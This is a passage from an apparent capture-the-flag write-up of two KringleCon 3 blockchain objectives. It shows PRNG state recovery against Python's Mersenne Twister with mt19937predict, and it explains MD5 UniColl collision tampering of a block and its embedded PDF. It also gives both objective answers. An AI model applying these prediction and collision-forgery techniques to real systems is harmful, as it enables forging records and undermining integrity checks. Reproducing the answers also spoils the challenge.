<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">bc</span><span class="o">.</span><span class="n">blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">dump_doc</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We get the embedded <em>PDF</em> that looks like this:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_06.webp" alt="128449.pdf" data-caption="128449.pdf" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      128449.pdf
      
        
        
      
    </figcaption>
  
</figure>
<p><em>Elf-on-the-shelf</em> is the reporter and the number that follows is its <em>RID</em> in decimal value. We get to know that <strong>Banjamin</strong> has the <em>PID</em> <code>0803508ada0a5ebf</code>.</p>
<p>Now that we have a fairly good understanding of the <em>Naughty/Nice Blockchain</em> structure, let&rsquo;s answer the objective question.</p>
<p>The nonces are 64-bit values and are generated with the <em>Python</em> <code>random</code> function. What we saw in the <a href="#snowball-game">Snowball Game</a>, is that <code>random</code> uses the <em>Marsene-Twister</em> (<em>MT19937</em>) algorithm for the <em>PRNG</em>. The standard implementation generates 32-bit random numbers. So how is the <em>Python</em> implementation used to generate 64-bit random numbers?</p>
<p>We can have a look at the <code>random</code> <a href="https://github.com/python/cpython/blob/master/Doc/library/random.rst">module from the CPython Github repository</a>. Its underlying implementation is done in <em>C</em> and can be found <a href="https://github.com/python/cpython/blob/master/Modules/_randommodule.c">here</a>. From the function <code>_random_Random_getrandbits_impl</code> we understand how random numbers bigger than 32-bit are generated:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_07.webp" alt="https://github.com/python/cpython/blob/master/Modules/_randommodule.c" data-caption="https://github.com/python/cpython/blob/master/Modules/_randommodule.c" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://github.com/python/cpython/blob/master/Modules/_randommodule.c
      
        
        
      
    </figcaption>
  
</figure>
<p>So for 64-bit numbers, it will generate two 32-bit numbers and concatenate them! This works for any bit size, if the size is not a multiple of 32, it just drops the least significant bits of the last random number to match the right size. Let&rsquo;s try it in an interpreter:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_08.webp" alt="32-bit (left) vs 64-bit (right) random numbers" data-caption="32-bit (left) vs 64-bit (right) random numbers" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      32-bit (left) vs 64-bit (right) random numbers
      
        
        
      
    </figcaption>
  
</figure>
<p>This a good news as we can still use the <code>marsene-twister-predictor</code> to predict the next nonces. We just need to extract the nonces from the blockchain, split each of them into two 32-bit numbers and feed them to the predictor. The following code extracts the nonces into <code>nonces.txt</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_09.webp" alt="extract nonces into a file" data-caption="extract nonces into a file" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      extract nonces into a file
      
        
        
      
    </figcaption>
  
</figure>
<p>Now we need to feed the last 624 numbers of the list to <code>mt19937predict</code> so that we can retrieve the future ones. As we have to find the nonce of the block 130000 (which is 4 blocks after the last one), we need to get the next 8 32-bit random numbers and concatenate the last 2 in their hexadecimal form:</p>
<div class="box">$ cat nonces.txt | tail -n 624 | mt19937predict | head -n 8<br />
1710059470     # used for block 129997<br />
3074734778<br />
15809261       # used for block 129998<br />
25586365<br />
3180594148     # used for block 129999<br />
2219797255  <br />
4079973021     # used for block 130000<br />
1460036376</div>
<p>We can get the final answer with <em>Python</em>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">1460036376</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="mi">4079973021</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
<span class="s1">&#39;57066318f32f729d&#39;</span>
</code></pre></td></tr></table>
</div>
</div><div class="notices success" data-title="Objective 11a answer">
  57066318f32f729d
</div>
<p>We can investigate the blockchain a little more and check if there is some block content that differs from others:</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">are there blocks that contain more than one document?</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_10.webp" alt="check what blocks have more than 1 document" data-caption="check what blocks have more than 1 document" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      check what blocks have more than 1 document
      
        
        
      
    </figcaption>
  
</figure>
<p>We have only one result, the block with <em>ID</em> <code>129459</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">are there blocks that contain a document type other than PDF?</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_11.webp" alt="check what blocks have doc type different than PDF" data-caption="check what blocks have doc type different than PDF" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      check what blocks have doc type different than PDF
      
        
        
      
    </figcaption>
  
</figure>
<p>Again, we have only one result, the block with <em>ID</em> <code>129459</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">so what&rsquo;s in this block <code>129459</code>?</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_12.webp" alt="weird block" data-caption="weird block" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      weird block
      
        
        
      
    </figcaption>
  
</figure>
<p>This block is definitely shady. This elf has the highest possible score, there is some binary data that seems meaningless and the <em>PDF</em> size is the biggest of all the blocks. If we dump the <em>PDF</em> data, we get <strong>Jack Frost</strong>&rsquo;s report:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_13.webp" alt="Jack Frost report" data-caption="Jack Frost report" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Jack Frost report
      
        
        
      
    </figcaption>
  
</figure>
<p>This is probably the block that <strong>Tinsel Upatree</strong> was mentioning. The block that has been tampered with by <strong>Jack Frost</strong> to be the nicest person in the world!!</p>
<div class="notices info" data-title="Note">
  Opening the <em>PDF</em> with <em>Adobe Reader</em> may not work as the file may be flagged as corrupted. It can be read, however, with browsers like <em>Chrome</em> or <em>Firefox</em>.
</div>
<h3 id="11b---naughtynice-list-with-blockchain-investigation-part2">11b - Naughty/Nice List with Blockchain Investigation Part 2</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_01.webp" alt="Objective 11b description" data-caption="Objective 11b description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 11b description
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s first confirm that <strong>Jack</strong>&rsquo;s altered block is the shady block we found out in the previous <em>Objective</em>. The following code will uncover it based on the <em>SHA256</em> that we are given:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_02.webp" alt="find the altered block" data-caption="find the altered block" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      find the altered block
      
        
        
      
    </figcaption>
  
</figure>
<p>The only output we get is, again, the block <code>129459</code>!</p>
<p>So we know that <strong>Jack Frost</strong> has been able to alter the block and keep the same <em>MD5</em> hash (collision) by changing only 4 bytes! The very first one seems obvious and is the sign that indicates if the elf is naughty or nice. We can change it from <code>1</code> to <code>0</code>. This makes <strong>Jack</strong> the naughtiest elf on <em>Earth</em>!</p>
<p>We know from the hints gathered in the <a href="#snowball-game">Snowball Game</a> that the technique that was used by <strong>Jack</strong> to generate the collision was <em>UniColl</em>. The technique is described in this <a href="https://speakerdeck.com/ange/colltris">Hash Collision Exploitation slide deck</a> (from slide 101 onward) and we can find some additional information <a href="https://github.com/corkami/collisions/blob/master/unicoll.md">here</a>.</p>
<p>Without going into the cryptographic details, the <em>UniColl</em> collision technique characteristics are the following:</p>
<ul>
<li>we can choose the prefix and it can be of any size</li>
<li>blocks are 64 bytes</li>
<li>the prefix is part of the collision blocks</li>
<li>given 2 binary blobs with the same <em>MD5</em> hash, only 2 bytes are different. The first byte difference is +1 and the second byte difference is -1.</li>
<li>the first byte is the 10th byte of the last block containing the prefix</li>
<li>the second byte is the 10th byte of the next block</li>
</ul>
<p>An example of the slide deck shows it more clearly:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_05.webp" alt="https://speakerdeck.com/ange/colltris?slide=113" data-caption="https://speakerdeck.com/ange/colltris?slide=113" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://speakerdeck.com/ange/colltris?slide=113
      
        
        
      
    </figcaption>
  
</figure>
<p>Knowing that and by looking at the block data, we start to understand what changes have been done:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_06.webp" alt="https://speakerdeck.com/ange/colltris?slide=113" data-caption="https://speakerdeck.com/ange/colltris?slide=113" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://speakerdeck.com/ange/colltris?slide=113
      
        
        
      
    </figcaption>
  
</figure>
<p>As we can see, the weird binary blob is part of the collision blocks and the second byte we have to change is probably in there. Let&rsquo;s have a look at the collision blocks binary data. We can call the <code>Block.block_data()</code> method and print the first 192 bytes (the size of 3 collision blocks). After some data arrangement, we get:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_07.webp" alt="collision blocks" data-caption="collision blocks" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      collision blocks
      
        
        
      
    </figcaption>
  
</figure>
<p>The 10th byte of the last prefix block corresponds to our naughty/nice flag. So if we change it to <code>0</code>, we will need to increment the 10th byte of the next block which is <code>0xd6</code>. Let&rsquo;s compute the hash after those 2 changes and check that the <em>MD5</em> has not changed:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_08.webp" alt="verify MD5 hashes before and after changes" data-caption="verify MD5 hashes before and after changes" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      verify MD5 hashes before and after changes
      
        
        
      
    </figcaption>
  
</figure>
<p>We got the first 2 bytes!</p>
<p><strong>Jack Frost</strong> has as well tampered with the <em>PDF</em> file to show a fake report instead of the original one made by <strong>Shinny Upatree</strong>. He must have as well used some trick to get an <em>MD5</em> collision. Let&rsquo;s first have a look at the <em>PDF</em> file in a hex editor. We can use <a href="https://hexed.it/">HexEd.it</a>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_09.webp" alt="https://hexed.it/" data-caption="https://hexed.it/" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://hexed.it/
      
        
        
      
    </figcaption>
  
</figure>
<p>We see a first <code>Catalog</code> object (with a hidden message for <strong>Santa</strong>) that references the object <code>2</code> that is a <code>Pages</code> dictionary which indicates what are the pages of the document. The <code>Pages</code>dictionary (in blue) only has 1 page (<code>Count 1</code>) and the page information is in the <code>Kid</code>object <code>23</code>.</p>
<p>We see as well another page tree that is not referenced (in green). It has as well only one page referred in <code>Kid</code> object <code>15</code>. If we change the <code>Catalog</code> reference to object <code>3</code> and save this new document, we access what seems the original report on <code>Jack Frost</code> which says the exact opposite of the previous one:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_10.webp" alt="Jack Frost original report" data-caption="Jack Frost original report" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Jack Frost original report
      
        
        
      
    </figcaption>
  
</figure>
<p>This is the 3rd byte to change then! This looks again like <strong>Jack</strong> used a <em>UniColl</em> collision. The method to create such <em>PDF</em> is described <a href="https://github.com/corkami/collisions#pdf">here</a> and at <a href="https://speakerdeck.com/ange/colltris?slide=194">the end of the slide deck</a>. The structure of such a <em>PDF</em> looks like this:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_12.webp" alt="https://github.com/corkami/collisions#pdf" data-caption="https://github.com/corkami/collisions#pdf" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://github.com/corkami/collisions#pdf
      
        
        
      
    </figcaption>
  
</figure>
<p>As per <em>UniColl</em> rules, if we increase the 10th byte of the prefix, we must decrease the 10th byte of the next block (64 bytes after). The <code>Pages</code> reference of our <em>PDF</em>, however, is not aligned to the 10th byte. This means that the prefix takes some additional bytes before the <em>PDF</em> data into account, so do not expect to have matching <code>MD5</code> hashes when doing those changes with the <code>PDF</code> alone:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_11.webp" alt="collision blocks (partial)" data-caption="collision blocks (partial)" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      collision blocks (partial)
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s do those changes and verify that the block&rsquo;s <em>MD5</em> does not change. Knowing that the second byte is at index <code>127</code> of the <em>PDF</em>, we can do the following:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_13.webp" alt="verify MD5 hashes before and after PDF changes" data-caption="verify MD5 hashes before and after PDF changes" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      verify MD5 hashes before and after PDF changes
      
        
        
      
    </figcaption>
  
</figure>
<p>Seems like we have recovered the original block! We compute the <em>SHA-256</em> hash as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11b_14.webp" alt="compute block SHA-256 hash" data-caption="compute block SHA-256 hash" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      compute block SHA-256 hash
      
        
        
      
    </figcaption>
  
</figure>
<div class="notices success" data-title="Objective 11b answer">
  fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb
</div>
